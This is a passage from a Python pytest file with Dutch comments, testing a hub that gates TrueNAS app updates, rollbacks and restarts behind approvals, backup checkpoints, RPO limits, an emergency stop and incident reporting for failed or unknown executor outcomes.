    _geblokkeerd(keur_goed(admin, v), "backup_checkpoint_ontbreekt")
    # Een herstelpunt dat de aanvrager zelf noemt, is geen bewijs: het veld bestaat niet eens in het voorstel.
    r = stel_voor(admin, "app.update", app_target("demo-app"), {**nieuw, "backup_checkpoint_id": str(uuid.uuid4())})
    assert r.status_code == 422, r.text
    # Een snapshot van een dataset die de app niet dekt, telt niet.
    _snapshot(stack, "testpool/photos", "foto")
    _geblokkeerd(keur_goed(admin, haal(admin, v)), "backup_checkpoint_ontbreekt")

    eerste = _snapshot(stack, "testpool/apps/demo-app", "voor-update")
    v = haal(admin, v)
    r = keur_goed(admin, v)
    assert r.status_code == 200 and r.json()["goedkeuring"]["backup_checkpoint_id"] == eerste["request_id"], r.text
    # Een nieuwer checkpoint dan bij de goedkeuring: de goedkeuring vervalt.
    tweede = _snapshot(stack, "testpool/apps", "nieuwer")
    r = voer_uit(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "goedkeuring_vervallen", r.text
    assert r.json()["details"]["gewijzigd"] == ["backup_checkpoint_id"]
    assert schrijfaanroepen(nas) == [
        "app.create",
        "pool.snapshot.create",
        "pool.snapshot.create",
        "pool.snapshot.create",
    ]
    v = haal(admin, v)
    r = keur_goed(admin, v)
    assert r.status_code == 200 and r.json()["goedkeuring"]["backup_checkpoint_id"] == tweede["request_id"], r.text
    r = voer_uit(admin, v)
    assert r.status_code == 200 and r.json()["resultaat"]["methode"] == "app.update", r.text
    naam, opties = nas.updated[-1]
    assert naam == "demo-app" and set(opties) == {"values"} and set(opties["values"]) == {"image"}

    # Terugzetten: het checkpoint van vóór de update is nu verouderd; een nieuw checkpoint is nodig.
    vorige = copy.deepcopy(nas.created[0]["values"])
    t = stel_voor(admin, "app.rollback", app_target("demo-app"), {"herstel_van": v["request_id"]}).json()
    assert t["preview"]["wijziging"]["soort"] == "terugzetten" and _codes(t) == ["backup_checkpoint_ontbreekt"]
    _snapshot(stack, "testpool", "voor-terugzetten")
    t = haal(admin, t)
    assert keur_goed(admin, t).status_code == 200
    r = voer_uit(admin, t)
    assert r.status_code == 200 and r.json()["resultaat"]["methode"] == "app.update", r.text
    assert nas.updated[-1] == ("demo-app", {"values": vorige})
    assert schrijfaanroepen(nas)[-2:] == ["pool.snapshot.create", "app.update"]
    assert "app.update(custom_compose)" not in nas.mutations


def _herstelpunten(admin: Any) -> list[dict[str, Any]]:
    r = admin.get("/api/v1/backups/herstelpunten", params={"app": "demo-app"})
    assert r.status_code == 200, r.text
    return list(r.json()["items"])


def _weigering(admin: Any, voorstel: dict[str, Any]) -> list[str]:
    """Goedkeuren wordt geweigerd met ``backup_checkpoint_ontbreekt``; geeft de reden(en) van het herstelpunt."""
    r = keur_goed(admin, haal(admin, voorstel))
    _geblokkeerd(r, "backup_checkpoint_ontbreekt")
    return next(b["details"] for b in r.json()["details"]["blokkades"] if b["code"] == "backup_checkpoint_ontbreekt")


def test_herstelpunt_telt_alleen_binnen_de_rpo_en_met_database_waar_dat_moet(
    stack: Stack, monkeypatch: pytest.MonkeyPatch
) -> None:
    """B12-006 (S-P2-090): het herstelpunt per app (snapshot + database-export + status) telt alleen als het
    ``geverifieerd`` is en jonger dan de RPO uit D16. Ouder dan de RPO of zonder RPO → update geweigerd
    (``backup_checkpoint_ontbreekt``), ook als het checkpoint nog binnen het uur van de executor valt. HARDE EIS: een
    herstelpunt van MediaGuard (of Emby, de mediaserver) zonder database telt niet."""
    from hub.actions import blokkades
    from hub.models import ActionRequest

    admin = stack.admin
    _demo_dataset(stack)
    assert voer_uit(admin, _installeer(stack)).status_code == 200
    stack.vernieuw()
    assert stack.toestand.besluiten is not None
    stack.toestand.besluiten["D16"] = ("Getest", {"per_app": [{"app_id": "demo-app", "rpo_uren": 0.5, "rto_uren": 1}]})
    cp = _snapshot(stack, "testpool/apps/demo-app", "voor-update")
    nieuw = {"image": {"repository": REPO, "tag": f"1.2.4@{DIGEST_B}"}}
    v = stel_voor(admin, "app.update", app_target("demo-app"), nieuw).json()
    assert v["blokkades"] == [], v
    [hp] = _herstelpunten(admin)
    assert (hp["checkpoint_id"], hp["status"], hp["reden"], hp["db_export"]) == (
        cp["request_id"],
        "geverifieerd",
        None,
        None,
    )
    assert hp["snapshot"]["datasets"] and hp["snapshot"]["actie_id"] == cp["request_id"]

    # 40 minuten oud: binnen het uur van de executor, maar ouder dan de RPO van 30 minuten → geweigerd.
    with stack.app.state.sessionmaker() as db:
        rij = db.get(ActionRequest, uuid.UUID(cp["request_id"]))
        assert rij is not None and rij.uitgevoerd_op is not None
        rij.uitgevoerd_op -= timedelta(minutes=40)
        db.commit()
    assert _weigering(admin, v) == ["herstelpunt_ouder_dan_rpo"]

    # Geen RPO voor deze app in D16: niets telt (fail-closed).
    stack.toestand.besluiten["D16"] = ("Getest", {"per_app": [{"app_id": "andere-app", "rpo_uren": 24, "rto_uren": 1}]})
    cp = _snapshot(stack, "testpool/apps", "zonder-rpo")  # ander doel: geen afkoeltijd
    assert _weigering(admin, v) == ["rpo_onbekend"]

    # HARDE EIS: dezelfde app herkend als MediaGuard (de herkenning zelf komt uit asm_policy en is daar getest).
    # Zonder database-export is het herstelpunt niet geverifieerd en telt het niet, ook vers en binnen de RPO.
    stack.toestand.besluiten["D16"] = ("Getest", {"per_app": [{"app_id": "demo-app", "rpo_uren": 24, "rto_uren": 1}]})
    echt = blokkades.herkenningen
    monkeypatch.setattr(blokkades, "herkenningen", lambda *a: echt(*a) | {"mediaguard"})
    assert _weigering(admin, v) == ["database_export_ontbreekt"]
    nieuwste = next(h for h in _herstelpunten(admin) if h["checkpoint_id"] == cp["request_id"])
    assert (nieuwste["status"], nieuwste["reden"]) == ("niet_geverifieerd", "database_export_ontbreekt")
    assert schrijfaanroepen(stack.nas)[-1] == "pool.snapshot.create"  # nooit een app.update


def test_na_een_migratie_alleen_terug_via_database_herstel(stack: Stack) -> None:
    """EX15 (ADR-0032 besluit 8): een update die een migratie meldt, is niet op alleen de image terug te zetten. De
    Hub weigert uit zijn eigen administratie (ook met een vers checkpoint); TrueNAS krijgt geen terugzetaanroep."""
    admin, nas = stack.admin, stack.nas
    _demo_dataset(stack)
    assert voer_uit(admin, _installeer(stack)).status_code == 200
    stack.vernieuw()
    _snapshot(stack, "testpool/apps/demo-app", "voor-update")
    nieuw = {"image": {"repository": REPO, "tag": f"1.2.4@{DIGEST_B}"}, "upgrade": {"migrations": True}}
    v = stel_voor(admin, "app.update", app_target("demo-app"), nieuw).json()
    assert v["blokkades"] == [] and keur_goed(admin, v).status_code == 200
    assert voer_uit(admin, v).status_code == 200
    _snapshot(stack, "testpool/apps", "voor-terugzetten")
    t = stel_voor(admin, "app.rollback", app_target("demo-app"), {"herstel_van": v["request_id"]}).json()
    assert _codes(t) == ["database_herstel_vereist"]
    _geblokkeerd(keur_goed(admin, t), "database_herstel_vereist")
    # Een herstelpunt dat geen eigen uitgevoerde wijziging van deze app is: herkomst onbekend.
    t = stel_voor(admin, "app.rollback", app_target("demo-app"), {"herstel_van": str(uuid.uuid4())}).json()
    assert _codes(t) == ["herkomst_onbekend"]
    assert len(nas.updated) == 1


def test_hub_vraagt_een_eigen_snapshot_van_elke_aangekoppelde_kinddataset(
    stack: Stack,
) -> None:
    """R-HARDE-EIS-1/2 bij de Hub: de database staat op een kinddataset onder het gekoppelde pad. Een niet-recursieve
    snapshot van de ouder is geen checkpoint; de recursieve telt alleen met de teruggelezen kindsnapshot."""
    admin = stack.admin
    _demo_dataset(stack)
    stack.nas.add_dataset("testpool/apps/demo-app/database")
    assert voer_uit(admin, _installeer(stack)).status_code == 200
    stack.vernieuw()
    _snapshot(stack, "testpool/apps/demo-app", "alleen-ouder", recursief=False)
    nieuw = {"image": {"repository": REPO, "tag": f"1.2.4@{DIGEST_B}"}}
    v = stel_voor(admin, "app.update", app_target("demo-app"), nieuw).json()
    assert _codes(v) == ["backup_checkpoint_ontbreekt"], v
    cp = _snapshot(stack, "testpool/apps", "met-kind")  # recursief (de afkoeltijd geldt per dataset)
    r = keur_goed(admin, haal(admin, v))
    assert r.status_code == 200 and r.json()["goedkeuring"]["backup_checkpoint_id"] == cp["request_id"], r.text


def test_hub_terugzetten_vraagt_ook_dekking_van_het_recept(stack: Stack) -> None:
    """R-HARDE-EIS-4 bij de Hub: het recept schrijft naar de opslag van vóór de bijwerking (hier photos). Een
    checkpoint van alleen de huidige opslag is dan geen herstelpunt; een dat beide dekt wel."""
    admin, nas = stack.admin, stack.nas
    _demo_dataset(stack)
    params = install_params("demo-app")
    params["app_create"]["values"]["storage"][0]["host_path_config"]["path"] = "/mnt/testpool/photos"
    v = stel_voor(admin, "app.install", app_target("demo-app"), params).json()
    assert keur_goed(admin, v).status_code == 200 and voer_uit(admin, v).status_code == 200
    stack.vernieuw()
    _snapshot(stack, "testpool/photos", "voor-update")
    v = stel_voor(
        admin,
        "app.update",
        app_target("demo-app"),
        {"image": {"repository": REPO, "tag": f"1.2.4@{DIGEST_B}"}},
    )
    v = v.json()
    assert keur_goed(admin, v).status_code == 200
    r = voer_uit(admin, v)
    assert r.json()["resultaat"]["readback"]["herstel_datasets"] == ["testpool/photos"], r.text
    # Daarna verhuist de opslag van de app naar zijn eigen dataset (buiten deze keten).
    app = nas.app("demo-app")
    assert app is not None
    app["config"]["storage"][0]["host_path_config"]["path"] = "/mnt/testpool/apps/demo-app"
    app["active_workloads"]["volumes"][0]["source"] = "/mnt/testpool/apps/demo-app"
    stack.vernieuw()
    _snapshot(stack, "testpool/apps/demo-app", "alleen-huidig")
    t = stel_voor(admin, "app.rollback", app_target("demo-app"), {"herstel_van": v["request_id"]}).json()
    assert _codes(t) == ["backup_checkpoint_ontbreekt"], t
    _snapshot(stack, "testpool", "beide")
    assert keur_goed(admin, haal(admin, t)).status_code == 200
    assert len(nas.updated) == 1


def test_hub_bijwerken_terug_naar_de_image_van_voor_een_migratie(stack: Stack) -> None:
    """R-HARDE-EIS-5 bij de Hub: ook via app.update (niet alleen app.rollback) is de image van vóór een gemelde
    migratie alleen met databaseherstel terug te zetten."""
    admin, nas = stack.admin, stack.nas
    _demo_dataset(stack)
    assert voer_uit(admin, _installeer(stack)).status_code == 200
    stack.vernieuw()
    oud = install_params("demo-app")["app_create"]["values"]["image"]
    _snapshot(stack, "testpool/apps/demo-app", "voor-update")
    nieuw = {
        "image": {"repository": REPO, "tag": f"1.2.4@{DIGEST_B}"},
        "upgrade": {"migrations": True},
    }
    v = stel_voor(admin, "app.update", app_target("demo-app"), nieuw).json()
    assert keur_goed(admin, v).status_code == 200 and voer_uit(admin, v).status_code == 200
    stack.vernieuw()
    _snapshot(stack, "testpool/apps", "voor-terug")
    terug = {"image": {"repository": oud["repository"], "tag": oud["tag"]}}
    t = stel_voor(admin, "app.update", app_target("demo-app"), terug).json()
    assert _codes(t) == ["database_herstel_vereist"], t
    _geblokkeerd(keur_goed(admin, t), "database_herstel_vereist")
    assert len(nas.updated) == 1


def test_kijker_kan_geen_update_voorstellen_of_goedkeuren(stack: Stack) -> None:
    """Toestandstabel S-P2-050f, rij kijkersrol: alleen lezen; geen voorstel, goedkeuring of uitvoering."""
    admin, nas = stack.admin, stack.nas
    _demo_dataset(stack)
    assert voer_uit(admin, _installeer(stack)).status_code == 200
    stack.vernieuw()
    _snapshot(stack, "testpool/apps/demo-app", "voor-update")
    v = stel_voor(
        admin, "app.update", app_target("demo-app"), {"image": {"repository": REPO, "tag": f"1.2.4@{DIGEST_B}"}}
    ).json()
    make_user(admin, "vera", "viewer")
    vera = login_as(stack.app, "vera")
    assert (
        stel_voor(
            vera, "app.update", app_target("demo-app"), {"image": {"repository": REPO, "tag": "1.2.5"}}
        ).status_code
        == 403
    )
    assert keur_goed(vera, v).status_code == 403
    assert voer_uit(vera, v).status_code == 403
    assert nas.updated == []


def _installeer(stack: Stack) -> dict[str, Any]:
    v = stel_voor(stack.admin, "app.install", app_target("demo-app"), install_params("demo-app")).json()
    assert keur_goed(stack.admin, v).status_code == 200
    return dict(v)


def test_noodstop_legt_alle_uitvoering_stil(stack: Stack) -> None:
    admin, nas = stack.admin, stack.nas
    make_user(admin, "oscar", "operator")
    oscar = login_as(stack.app, "oscar")
    v = stel_voor(admin, "app.restart", app_target("my-house")).json()
    r = oscar.put("/api/v1/actions/noodstop", json={"actief": True, "reden": "x"}, headers=idem())
    assert r.status_code == 403
    r = admin.put("/api/v1/actions/noodstop", json={"actief": True}, headers=idem())
    assert r.status_code == 422  # een reden is verplicht
    r = admin.put("/api/v1/actions/noodstop", json={"actief": True, "reden": "onderhoud aan de NAS"}, headers=idem())
    assert r.status_code == 200 and r.json()["actief"] is True and r.json()["door"] == "beheerder", r.text
    _geblokkeerd(voer_uit(admin, v), "noodstop_actief")
    assert schrijfaanroepen(nas) == []
    assert admin.get("/api/v1/actions").json()["noodstop"]["actief"] is True
    r = admin.put("/api/v1/actions/noodstop", json={"actief": False}, headers=idem())
    assert r.status_code == 200 and r.json()["actief"] is False
    assert voer_uit(admin, v).status_code == 200 and schrijfaanroepen(nas) == ["app.redeploy"]
    acties = audit_acties(stack.app)
    assert "action.emergency_stop.enabled" in acties and "action.emergency_stop.disabled" in acties


# ---------------------------------------------------------------------- afwijking, onbekende uitkomst
def test_afwijking_stopt_alles_en_wordt_een_incident(stack: Stack, periodic_run: Any) -> None:
    admin, nas = stack.admin, stack.nas
    nas.silent_noop.add("app.stop")  # TrueNAS meldt succes, maar de app draait nog
    v = stel_voor(admin, "app.stop", app_target("my-house")).json()
    assert keur_goed(admin, v).status_code == 200  # Custom App stoppen: R2
    r = voer_uit(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "afwijking", r.text
    nu = haal(admin, v)
    assert nu["status"] == "afwijking" and nu["resultaat"]["reden"] == "staat_verschilt"
    assert "action.execution.deviated" in audit_acties(stack.app)
    periodic_run("incidenten_bijwerken")
    incidenten = admin.get("/api/v1/incidents").json()["items"]
    afw = [i for i in incidenten if i["soort"] == "actie.afwijking"]
    assert len(afw) == 1 and afw[0]["ernst"] == "kritiek", incidenten
    # De executor voert daarna niets meer uit tot een beheerder hem vrijgeeft; de Hub meldt dat eerlijk.
    w = stel_voor(admin, "app.restart", app_target("mediaguard")).json()
    r = voer_uit(admin, w)
    assert r.status_code == 409 and r.json()["code"] == "uitvoering_geweigerd", r.text
    assert r.json()["details"]["executor"]["code"] == "executor_gestopt"
    assert haal(admin, w)["status"] == "mislukt"
    assert schrijfaanroepen(nas) == ["app.stop"]


def test_executor_onbereikbaar_uitkomst_onbekend_en_ophelderen(stack: Stack, periodic_run: Any) -> None:
    from hub.models import ActionRequest

    admin, nas = stack.admin, stack.nas
    v = stel_voor(admin, "app.restart", app_target("my-house")).json()
    stack.servers.pop().stop()  # de executor is weg
    r = voer_uit(admin, v)
    assert r.status_code == 502 and r.json()["code"] == "uitkomst_onbekend", r.text
    assert haal(admin, v)["status"] == "onbekend" and schrijfaanroepen(nas) == []
    # Onbekend is geen succes en geen mislukking; niets wordt blind herhaald.
    r = voer_uit(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "status_past_niet", r.text
    periodic_run("incidenten_bijwerken")
    soorten = [i["soort"] for i in admin.get("/api/v1/incidents").json()["items"]]
    assert "actie.uitkomst_onbekend" in soorten
    r = admin.post(f"/api/v1/actions/{v['request_id']}/reconcile", headers=idem())
    assert r.status_code == 409 and r.json()["code"] == "uitkomst_onbekend", r.text

    # De executor is terug en kent het verzoek niet. Zolang het verzoek nog geldig kan zijn: onbekend.
    from executor.app import create_app

    terug = Served(create_app(stack.ex_settings))
    stack.servers.append(terug)
    stack.ex_url = terug.url
    r = admin.post(f"/api/v1/actions/{v['request_id']}/reconcile", headers=idem())
    assert r.status_code == 409 and r.json()["code"] == "uitkomst_onbekend", r.text
    # Na de geldigheid van het ondertekende verzoek kan het niet meer worden uitgevoerd: aantoonbaar niet gebeurd.
    with stack.app.state.sessionmaker() as db:
        rij = db.get(ActionRequest, uuid.UUID(v["request_id"]))
        rij.gestart_op = rij.gestart_op - timedelta(minutes=10)
        db.commit()
    r = admin.post(f"/api/v1/actions/{v['request_id']}/reconcile", headers=idem())
    assert r.status_code == 200 and r.json()["status"] == "mislukt", r.text
    assert r.json()["resultaat"]["code"] == "niet_uitgevoerd" and schrijfaanroepen(nas) == []
    periodic_run("incidenten_bijwerken")
    open_ = [i for i in admin.get("/api/v1/incidents").json()["items"] if i["soort"] == "actie.uitkomst_onbekend"]
    assert all(i["status"] == "opgelost" for i in open_), open_


def _events(app: Any, event_type: str) -> list[dict[str, Any]]:
    """De payloads van de eigen outbox-events van één soort, oudste eerst."""
    from sqlalchemy import select

    from hub.models import OutboxEvent

    with app.state.sessionmaker() as db:
        rows = db.scalars(select(OutboxEvent).where(OutboxEvent.event_type == event_type).order_by(OutboxEvent.seq))
        return [dict(e.payload) for e in rows]


def _incidenten(admin: Any, soort: str) -> list[dict[str, Any]]:
    return [i for i in admin.get("/api/v1/incidents").json()["items"] if i["soort"] == soort]


def _journaal_weg(monkeypatch: pytest.MonkeyPatch) -> None:
    """Het journaal van de executor valt weg ná de schrijfaanroep (vastleggen van het einde en van de stop)."""
    from executor.journal import Journal, JournalUnavailable

    def weg(self: Journal, *a: Any, **k: Any) -> None:
        raise JournalUnavailable("OperationalError")

    monkeypatch.setattr(Journal, "finish", weg)
    monkeypatch.setattr(Journal, "stop", weg)


def _jobstatus_weg(nas: FakeTrueNAS) -> None:
    """TrueNAS neemt de job aan, maar de jobstatus is daarna niet op te vragen (executor: ``job_status_onbekend``)."""
    nas.keys[WRITE_KEY].deny.add("core.get_jobs")


@pytest.mark.parametrize(
    ("oorzaak", "reden"),
    [
        ("journaal_niet_beschikbaar", "journaal_niet_beschikbaar"),
        # De executor meldt een onbekende jobstatus na de schrijfaanroep als ``uitkomst_onbekend`` (uitvoeren.py,
        # ONBEKENDE_UITKOMST); de Hub geeft door wat de executor zegt.
        ("job_status_onbekend", "uitkomst_onbekend"),
    ],
)
def test_executor_stopt_na_de_schrijfaanroep_reden_en_gestopt_in_antwoord_event_en_incident(
    stack: Stack, periodic_run: Any, monkeypatch: pytest.MonkeyPatch, oorzaak: str, reden: str
) -> None:
    """S-P2-030: na de schrijfaanroep antwoordt de executor 409 ``afwijking`` met ``reden`` en ``gestopt: true``. De Hub
    geeft die twee door aan het actieantwoord, het event ``action.run.failed`` en het incident ``actie.afwijking``."""
    admin, nas = stack.admin, stack.nas
    if oorzaak == "journaal_niet_beschikbaar":
        _journaal_weg(monkeypatch)
    else:
        _jobstatus_weg(nas)
    v = stel_voor(admin, "app.restart", app_target("my-house")).json()
    r = voer_uit(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "afwijking", r.text
    assert r.json()["details"]["reden"] == reden and r.json()["details"]["gestopt"] is True, r.text
    nu = haal(admin, v)
    assert nu["status"] == "afwijking", nu
    assert nu["resultaat"]["reden"] == reden and nu["resultaat"]["gestopt"] is True, nu
    assert schrijfaanroepen(nas) == ["app.redeploy"]
    ev = [e for e in _events(stack.app, "action.run.failed") if e["request_id"] == v["request_id"]]
    assert len(ev) == 1 and ev[0]["uitkomst"] == "afwijking", ev
    assert ev[0]["reden"] == reden and ev[0]["gestopt"] is True, ev
    periodic_run("incidenten_bijwerken")
    afw = _incidenten(admin, "actie.afwijking")
    assert len(afw) == 1 and afw[0]["ernst"] == "kritiek", afw
    assert afw[0]["details"]["reden"] == reden and afw[0]["details"]["gestopt"] is True, afw


def _antwoord_valt_weg(monkeypatch: pytest.MonkeyPatch) -> dict[str, bool]:
    """Het antwoord van de executor op ``/execute`` komt niet aan (de executor heeft wel gewerkt), en het journaal is
    op dat moment ook niet bereikbaar. Met ``stand["journaal_weg"] = False`` antwoordt het journaal weer."""
    from hub import servicecalls

    echte = servicecalls.call
    stand = {"journaal_weg": True}

    def call(base: str, method: str, path: str, **kw: Any) -> Any:
        if path == "/api/v1/execute":
            echte(base, method, path, **kw)
            raise servicecalls.ServiceCallError("read_timeout")
        if path.startswith("/api/v1/executions/") and stand["journaal_weg"]:
            raise servicecalls.ServiceCallError("connect_error")
        return echte(base, method, path, **kw)

    monkeypatch.setattr(servicecalls, "call", call)
    return stand


@pytest.mark.parametrize("journaal", ["staat_verschilt", "uitkomst_onbekend", "mislukt"])
def test_journaalrij_die_achteraf_afwijking_of_mislukt_is_neemt_ophelderen_over(
    stack: Stack, periodic_run: Any, monkeypatch: pytest.MonkeyPatch, journaal: str
) -> None:
    """De Hub kreeg geen antwoord (uitkomst onbekend); het journaal van de executor zegt achteraf ``afwijking``
    (``staat_verschilt`` of ``uitkomst_onbekend``) of ``mislukt``. Ophelderen (``reconcile``) neemt dat over, met
    ``reden`` en ``gestopt`` in het antwoord, het event en het incident; er wordt niets herhaald."""
    admin, nas = stack.admin, stack.nas
    if journaal == "staat_verschilt":
        nas.silent_noop.add("app.stop")  # TrueNAS meldt succes, maar de app draait nog
        v = stel_voor(admin, "app.stop", app_target("my-house")).json()
        assert keur_goed(admin, v).status_code == 200
        methode = "app.stop"
    else:
        if journaal == "uitkomst_onbekend":
            _jobstatus_weg(nas)
        else:
            nas.fail["app.redeploy"] = "proef: redeploy mislukt"
        v = stel_voor(admin, "app.restart", app_target("my-house")).json()
        methode = "app.redeploy"
    stand = _antwoord_valt_weg(monkeypatch)
    r = voer_uit(admin, v)
    assert r.status_code == 502 and r.json()["code"] == "uitkomst_onbekend", r.text
    assert haal(admin, v)["status"] == "onbekend" and schrijfaanroepen(nas) == [methode]
    periodic_run("incidenten_bijwerken")
    assert _incidenten(admin, "actie.uitkomst_onbekend"), "geen incident voor de onbekende uitkomst"

    stand["journaal_weg"] = False
    r = admin.post(f"/api/v1/actions/{v['request_id']}/reconcile", headers=idem())
    nu = haal(admin, v)
    ev = [e for e in _events(stack.app, "action.run.failed") if e["request_id"] == v["request_id"]]
    assert ev[0]["uitkomst"] == "onbekend", ev
    if journaal == "mislukt":
        assert r.status_code == 502 and r.json()["code"] == "uitvoering_mislukt", r.text
        assert r.json()["details"]["reden"] == "job_mislukt [FAILED]", r.text
        assert nu["status"] == "mislukt" and nu["resultaat"]["gestopt"] is False, nu
        assert ev[-1]["uitkomst"] == "mislukt" and ev[-1]["reden"] == "job_mislukt [FAILED]", ev
        # S-P2-040, R-TECH-2: de executor meldt hier zelf gestopt=false; de Hub geeft precies dat door.
        assert ev[-1]["gestopt"] is False, ev
    else:
        assert r.status_code == 409 and r.json()["code"] == "afwijking", r.text
        assert r.json()["details"]["reden"] == journaal and r.json()["details"]["gestopt"] is True, r.text
        assert nu["status"] == "afwijking" and nu["resultaat"]["gestopt"] is True, nu
        assert nu["resultaat"]["reden"] == journaal and nu["resultaat"]["bron"] == "journaal_executor", nu
        assert ev[-1]["uitkomst"] == "afwijking", ev
        assert ev[-1]["reden"] == journaal and ev[-1]["gestopt"] is True, ev
    assert len(ev) == 2 and schrijfaanroepen(nas) == [methode]  # niets herhaald
    periodic_run("incidenten_bijwerken")
    assert all(i["status"] == "opgelost" for i in _incidenten(admin, "actie.uitkomst_onbekend"))
    afw = _incidenten(admin, "actie.afwijking")
    if journaal == "mislukt":
        assert afw == [], afw  # mislukt met onveranderd doel is geen incident (alleen audit)
    else:
        assert len(afw) == 1 and afw[0]["ernst"] == "kritiek", afw
        assert afw[0]["details"]["reden"] == journaal and afw[0]["details"]["gestopt"] is True, afw
    # Daarna weer ophelderen kan niet: de uitkomst is bekend.
    r = admin.post(f"/api/v1/actions/{v['request_id']}/reconcile", headers=idem())
    assert r.status_code == 409 and r.json()["code"] == "status_past_niet", r.text


# ---------------------------------------------------------------------- V-046: vaste veldenset van het actieantwoord
WEERGAVE_VELDEN = {
    "request_id",
    "status",
    "action_id",
    "target",
    "parameters_sha256",
    "reason",
    "actor",
    "evidence_ids",
    "risk_class",
    "risk_claim",
    "risk_claim_genegeerd",
    "rule_ids",
    "goedkeuring_nodig",
    "policy_hash",
    "uitvoerder",
    "resource_etag",
    "preview_hash",
    "preview",
    "blokkades",
    "goedkeuring",
    "resultaat",
    "aangemaakt_op",
    "bijgewerkt_op",
    "geldig_tot",
    "gestart_op",
    "uitgevoerd_op",
}
GOEDKEURING_VELDEN = {
    "approval_id",
    "approved_by",
    "approved_at",
    "expires_at",
    "preview_hash",
    "resource_etag",
    "policy_hash",
    "risk_class",
    "backup_checkpoint_id",
    "gebruikt_op",
    "vervallen_op",
    "vervallen_reden",
}
PREVIEW_VELDEN = {
    "schema",
    "action_id",
    "omschrijving",
    "target",
    "parameters_sha256",
    "uitvoerder",
    "risk_class",
    "rule_ids",
    "goedkeuring_nodig",
    "requires_backup",
    "opslagmutatie",
    "herkend_als",
    "kritiek",
    "policy_hash",
    "resource_etag",
    "huidig",
    "wijziging",
    "dataretentie",
    "terugdraaien",
}
RESULTAAT_UITGEVOERD = {
    "status",
    "methode",
    "before_hash",
    "after_hash",
    "resource_etag",
    "readback",
    "waarschuwingen",
    "policy_hash",
    "uitgevoerd_op",
}


def test_actieantwoord_heeft_precies_de_vaste_velden(stack: Stack) -> None:
    """V-046: elk actieantwoord (voorstel, goedkeuring, uitvoering, opvragen, lijst) heeft precies deze velden; geen
    parameterwaarden, geen eenmalige nonce en geen uitvoeringsnonce. Een nieuw veld vraagt een bewuste keuze hier."""
    from sqlalchemy import select

    from hub.models import Approval

    admin = stack.admin
    v = stel_voor(admin, "app.stop", app_target("my-house")).json()
    assert set(v) == WEERGAVE_VELDEN and set(v["preview"]) == PREVIEW_VELDEN and v["goedkeuring"] is None, v
    g = keur_goed(admin, v)
    assert g.status_code == 200, g.text
    assert set(g.json()) == WEERGAVE_VELDEN and set(g.json()["goedkeuring"]) == GOEDKEURING_VELDEN, g.text
    r = voer_uit(admin, v)
    assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
    assert set(r.json()["resultaat"]) == RESULTAAT_UITGEVOERD, r.text
    lijst = admin.get("/api/v1/actions").json()["items"]
    antwoorden = [v, g.json(), r.json(), haal(admin, v), *lijst]
    for a in antwoorden:
        assert set(a) == WEERGAVE_VELDEN, sorted(set(a) ^ WEERGAVE_VELDEN)
        assert a["goedkeuring"] is None or set(a["goedkeuring"]) == GOEDKEURING_VELDEN, a["goedkeuring"]
        assert a["preview"] is None or set(a["preview"]) == PREVIEW_VELDEN, a["preview"]
    rij = _rij(stack.app, v["request_id"])
    with stack.app.state.sessionmaker() as db:
        ap = db.scalars(select(Approval).where(Approval.request_id == uuid.UUID(v["request_id"]))).one()
    geheim = [str(ap.one_time_nonce), str(rij.execution_nonce)]
    assert rij.execution_nonce is not None
    teksten = [g.text, r.text, admin.get(f"/api/v1/actions/{v['request_id']}").text, admin.get("/api/v1/actions").text]
    assert not any(n in t for n in geheim for t in teksten)


def test_truenas_weigert_de_schrijfactie_mislukt_zonder_afwijking(stack: Stack) -> None:
    admin, nas = stack.admin, stack.nas
    nas.fail["app.redeploy"] = "proef: redeploy mislukt"
    v = stel_voor(admin, "app.restart", app_target("my-house")).json()
    r = voer_uit(admin, v)
    assert r.status_code == 502 and r.json()["code"] == "uitvoering_mislukt", r.text
    assert haal(admin, v)["status"] == "mislukt"
    assert "action.execution.failed" in audit_acties(stack.app)
    # S-P2-040, R-TECH-1: het event van dit pad (502 uitvoering_mislukt) neemt de reden van de executor over; de
    # executor meldt hier geen stop, dus "gestopt" staat er niet in (de Hub leidt het nooit af).
    reden = r.json()["details"]["reden"]
    assert reden == "job_mislukt", r.text
    ev = [e for e in _events(stack.app, "action.run.failed") if e["request_id"] == v["request_id"]]
    assert len(ev) == 1 and ev[0]["uitkomst"] == "mislukt", ev
    assert ev[0]["reden"] == reden and "gestopt" not in ev[0], ev


def test_executor_zonder_schrijfsleutel_voert_niets_uit(
    admin: Any, app: Any, nas: FakeTrueNAS, worker_once: Any, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    s = bouw_stack(
        admin=admin,
        app=app,
        nas=nas,
        worker_once=worker_once,
        tmp_path=tmp_path,
        monkeypatch=monkeypatch,
        schrijfsleutel=False,
    )
    try:
        v = stel_voor(admin, "app.restart", app_target("my-house")).json()
        r = voer_uit(admin, v)
        assert r.status_code in (409, 501), r.text
        assert r.json()["code"] in ("uitvoering_geweigerd", "capability_unavailable"), r.text
        assert haal(admin, v)["status"] == "mislukt" and schrijfaanroepen(nas) == []
    finally:
        s.stop()


# ---------------------------------------------------------------------- S-P2-040 herstel (R-VEILIG-1, -2 en -3)
def test_preview_toont_wat_naar_truenas_gaat_en_een_eigen_opdracht_wordt_geweigerd(stack: Stack) -> None:
    """R-VEILIG-1 (blokkerend): een operator stelde een installatie voor met hostname, eigen DNS, run_as, tty, stdin,
    labels en zonder ingebouwde healthcheck; de preview toonde ze niet, een beheerder keurde ze ongezien goed en ze
    gingen naar ``app.create``. Nu staat elk gezet veld met zijn waarde in de preview, en alles wat naar TrueNAS gaat
    staat daarin (alleen de waarde van een omgevingsvariabele niet; ADR-0030 besluit 28). Een eigen opdracht
    (``command``, ``entrypoint``) weigert de Hub met ``501`` tot een installatiescherm hem veilig kan tonen (besluit
    regisseur, optie C; ADR-0030 besluit 32)."""
    admin, nas = stack.admin, stack.nas
    make_user(admin, "op9", "operator")
    op = login_as(stack.app, "op9")
    zichtbaar: dict[str, Any] = {
        "hostname": "proef-hostnaam-zichtbaar",
        "dns_config": {"nameservers": ["127.0.0.1"], "searches": [], "options": []},
        "run_as_custom_user": True,
        "run_as": {"user": 568, "group": 568},
        "tty": True,
        "stdin": True,
        "labels": [{"key": "proef.label", "value": "proefwaarde-label", "containers": []}],
        "disable_builtin_healthcheck": True,
        "notes": "notitie die de beheerder ziet",
    }
    opdrachten = {
